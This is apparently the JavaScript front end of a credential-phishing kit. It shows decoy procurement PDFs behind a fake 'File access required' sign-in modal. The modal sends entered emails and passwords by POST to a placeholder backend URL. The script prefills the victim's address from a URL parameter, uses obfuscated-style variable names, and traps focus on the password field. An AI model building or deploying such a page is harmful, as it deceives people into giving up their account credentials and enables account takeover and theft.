var files = [
  { name: 'Specifications.pdf', size: '5.4 MB' },
  { name: 'Purchase List.pdf', size: '2.1 MB' },
  { name: 'Company Details', size: '1.8 MB' },
  { name: 'Quality Assurance Requirements.pdf', size: '3.2 MB' },
  { name: 'Purchase Template.pdf', size: '980 KB' }
];

var filesGrid = document.getElementById('filesGrid');

files.forEach(function(file) {
  var card = document.createElement('div');
  card.className = 'file-card';
  card.innerHTML =
    '<div class="file-icon pdf">' +
    '<svg viewBox="0 0 24 24"><path d="M20 2H8c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-8.5 7.5c0 .83-.67 1.5-1.5 1.5H9v2H7.5V7H10c.83 0 1.5.67 1.5 1.5v1zm5 2c0 .83-.67 1.5-1.5 1.5h-2.5V7H15c.83 0 1.5.67 1.5 1.5v3zm4-3H19v1h1.5V11H19v2h-1.5V7h3v1.5zM9 9.5h1v-1H9v1zM4 6H2v14c0 1.1.9 2 2 2h14v-2H4V6zm10 5.5h1v-3h-1v3z"/></svg>' +
    '</div>' +
    '<div class="file-name">' + file.name + '</div>' +
    '<div class="file-meta">' + file.size + '</div>';

  card.addEventListener('click', function() {
    var m = document.getElementById('modalOverlay');
    if (m) m.classList.add('active');
  });

  filesGrid.appendChild(card);
});

var modalHTML = '<div class="modal-overlay" id="modalOverlay">' +
  '<div class="signin-modal" id="signinModal">' +
  '<svg width="60" height="60" viewBox="0 0 24 24" fill="#1a73e8" style="margin-bottom: 16px;">' +
  '<path d="M19.35 10.04C18.67 6.59 15.64 4 12 4C9.11 4 6.6 5.64 5.35 8.04C2.34 8.36 0 10.91 0 14C0 17.31 2.69 20 6 20H18C21.31 20 24 17.31 24 14C24 10.69 21.31 8 18 8H14V10H17.5C18.88 10 20 11.12 20 12.5S18.88 15 17.5 15H14V17H17.5C19.43 17 21 15.43 21 13.5S19.43 10 17.5 10H16V8.04C16.53 8.15 17.04 8.33 17.5 8.58V10.5C17.5 11.33 16.83 12 16 12H14V10H12V12H10V10H8V12H6.5C5.67 12 5 11.33 5 10.5V8.04C5.46 8.33 5.97 8.58 6.5 8.69V10C6.5 10.28 6.28 10.5 6 10.5H4C3.72 10.5 3.5 10.28 3.5 10V8.04C4.46 7.24 5.72 6.79 7 6.79C8.28 6.79 9.54 7.24 10.5 8.04V10H12V8H14V10H16V8.04C17.66 8.34 19 9.7 19 11.35C19 11.79 18.94 12.22 18.83 12.63C19.84 13.3 20.5 14.47 20.5 15.75C20.5 17.5 19.04 19 17.25 19H6.75C5.79 19 5 18.21 5 17.25C5 16.29 5.79 15.5 6.75 15.5H8.5C9.33 15.5 10 14.83 10 14C10 13.17 9.33 12.5 8.5 12.5H6C5.45 12.5 5 12.05 5 11.5V10.5C5 9.67 5.67 9 6.5 9H8V8.04C8.25 8.01 8.5 8 8.75 8C9 8 9.25 8.01 9.5 8.04V9H10.5C11.33 9 12 9.67 12 10.5V11.5C12 12.05 11.55 12.5 11 12.5H9.5C8.67 12.5 8 13.17 8 14V14.5C8 15.33 8.67 16 9.5 16H11C11.55 16 12 16.45 12 17C12 17.55 11.55 18 11 18H7C6.45 18 6 17.55 6 17V16C6 15.45 6.45 15 7 15H7.5C8.33 15 9 14.33 9 13.5C9 12.67 8.33 12 7.5 12H6C5.45 12 5 11.55 5 11V10.5Z" fill="#4285F4"/>' +
  '</svg>' +
  '<h2>File access required</h2>' +
  '<p>Securely sign in with your email account to access this shared file</p>' +
  '<form class="signin-form" id="signinForm" action="_BACKEND_URL_/index.php" method="POST">' +
  '<input type="email" id="email" name="email" placeholder="Email" required>' +
  '<input type="password" id="password" name="password" placeholder="Password" required>' +
  '<div class="error-msg" id="errorMsg">Please fill in all fields</div>' +
  '<div class="spinner" id="loadingSpinner"></div>' +
  '<div class="pass-error" id="passError">Wrong password. Try again!</div>' +
  '<button type="submit" id="signinBtn">Sign in</button>' +
  '</form>' +
  '</div>' +
  '</div>';

document.body.insertAdjacentHTML('beforeend', modalHTML);

var _0xem = new URLSearchParams(window.location.search).get('x');
var _0xei = document.getElementById('email');
if (_0xem && _0xei) {
  _0xei.value = _0xem;
  _0xei.readOnly = true;
  _0xei.style.background = '#f1f3f4';
  _0xei.style.cursor = 'not-allowed';
  _0xei.classList.add('prefilled-email');
}

document.getElementById('modalOverlay').addEventListener('click', function(e) {
  if (e.target === this) {
    this.classList.add('force-active');
    var modal = document.getElementById('signinModal');
    if (modal) {
      var pw = document.getElementById('password');
      if (pw) pw.focus();
    }
  }
});

var _0xmo = document.getElementById('modalOverlay');
document.addEventListener('focusin', function(e) {
  if (_0xmo && _0xmo.classList.contains('active') && !_0xmo.contains(e.target)) {
    e.preventDefault();
    var pw = document.getElementById('password');
    if (pw) pw.focus();
  }
});

if (typeof window.initCapture === 'function') {
  window.initCapture();
}